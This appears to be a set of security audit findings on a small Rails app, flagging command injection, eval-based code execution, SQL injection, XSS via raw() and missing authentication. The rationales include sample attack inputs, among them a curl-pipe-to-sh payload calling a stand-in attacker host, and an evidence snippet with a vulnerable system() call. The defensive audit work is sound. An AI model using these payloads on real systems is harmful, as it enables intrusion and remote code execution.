candidates.title: OS command injection via unsanitized params[:dir] in system()
candidates.rationale: The controller concatenates the attacker-controlled request parameter params[:dir] into a single command string passed to Kernel#system. Because the whole command is one shell string, Ruby invokes it through /bin/sh, so shell metacharacters are interpreted. A request such as ?dir=. ; id or ?dir=$(curl attacker.tld/x|sh) yields arbitrary command execution as the Rails process user.

candidates.title: Remote code execution via eval() of request parameter
candidates.rationale: params[:expr] is passed straight to Kernel#eval and its return value rendered. Any request can execute arbitrary Ruby in the application context (e.g. ?expr=system('id') or ?expr=`whoami`), giving full server compromise. No allowlist, parsing, or sandboxing is applied.

candidates.title: SQL injection in ActiveRecord where() string interpolation
candidates.rationale: The name filter is built by interpolating params[:name] into a SQL fragment passed to User.where, which ActiveRecord treats as raw SQL. An input such as ' OR '1'='1 or ' UNION SELECT ... exposes or exfiltrates the whole users table and can be extended to stacked/boolean-based extraction.

candidates.title: Cross-site scripting via raw() on user bio in ERB template
candidates.rationale: raw() marks @user.bio as html_safe, bypassing Rails' default ERB output escaping. A user-controlled bio containing <script> or an event-handler attribute executes in the browser of anyone viewing the profile, enabling session theft and account takeover. Contrast app/safe_view.erb, which uses plain <%= %>.

candidates.title: Broken access control: user record lookup has no authentication or ownership scoping (IDOR)
candidates.rationale: UsersController#show exposes user records selected by a client-supplied `params[:name]` and has no `before_action :authenticate_user!`, no authorization check, and no scoping to the current user. Any unauthenticated request can enumerate and retrieve other users' records. A grep across the snapshot for before_action/authenticate/authorize/current_user returned no hits, confirming no auth layer exists to compensate. The missing check is at this action.

candidates.title: Broken access control: directory listing action requires no authentication or authorization
candidates.rationale: FilesController#list performs a filesystem listing and is exposed with no authentication, no authorization/role check, and no `before_action` guard anywhere in the snapshot. Unauthenticated callers can invoke the listing for arbitrary paths, and combined with the command injection at line 3 this yields unauthenticated remote command execution. The missing check is at this action.
candidates.evidence:
class FilesController < ApplicationController
  def list
    system("ls " + params[:dir])
